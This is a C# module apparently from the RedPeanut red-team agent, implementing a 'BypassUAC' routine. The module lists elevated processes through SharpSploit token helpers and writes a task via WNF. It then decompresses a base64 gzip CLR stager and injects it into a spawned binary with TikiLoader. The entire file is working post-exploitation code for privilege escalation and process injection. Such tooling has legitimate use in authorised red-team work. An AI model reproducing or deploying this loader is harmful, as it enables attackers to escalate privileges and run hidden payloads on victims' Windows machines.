using RedPeanutAgent.Core;
using RedPeanutAgent.Execution;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static RedPeanutAgent.Core.Natives;
using static RedPeanutAgent.Execution.WnfHelper;

class TokenManipulation
{
    static private string nutclr = "#NUTCLR#";
    static private string task = "#TASK#";
    static private string binary = "#BINARY#";
    static private string arguments = "#ARGUMENTS#";
    static private string path = "#PATH#";
    static private string spawn = "#SPAWN#";

    public static void Execute(string[] args)
    {
        string binarytorun;
        string binarypath;
        string binaryarguments;
        if (string.IsNullOrEmpty(binary))
        {
            binarytorun = spawn;
            binarypath = @"C:\WINDOWS\System32\";
            binaryarguments = string.Empty;
        }
        else
        {
            binarytorun = binary;
            binarypath = path;
            binaryarguments = arguments;
        }


        Console.WriteLine(BypassUAC(binarytorun, binarypath, binaryarguments));
    }

    public static bool BypassUAC(string binary, string path, string arguments)
    {
        SharpSploit.Credentials.Tokens t = new SharpSploit.Credentials.Tokens();
        List<Process> processes = GetUserProcessTokens(true).Select(UPT => UPT.Process).ToList();
        Console.WriteLine("Elevated processes: " + processes.Count);

        foreach (Process process in processes)
        {
            // Get PrimaryToken

            WriteWnF(task);

            //Inject CLR and run stager
            byte[] payload = DecompressDLL(Convert.FromBase64String(nutclr));

            try
            {
                var ldr = new TikiLoader.Loader();

                ldr.LoadElevated(binary, payload, process.Id);

                return t.RevertToSelf();
            }
            catch (Exception)
            {
                t.RevertToSelf();
                continue;
            }
        }
        return false;
    }

    private static List<SharpSploit.Credentials.Tokens.UserProcessToken> GetUserProcessTokens(bool Elevated = false)
    {
        return Process.GetProcesses().Select(P =>
        {
            try
            {
                return new SharpSploit.Credentials.Tokens.UserProcessToken(P);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("CreateUserProcessTokenException: " + e.Message);
                return null;
            }
        }).Where(P => P != null).Where(P => (!Elevated || P.IsElevated)).ToList();
    }

    public static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }
}

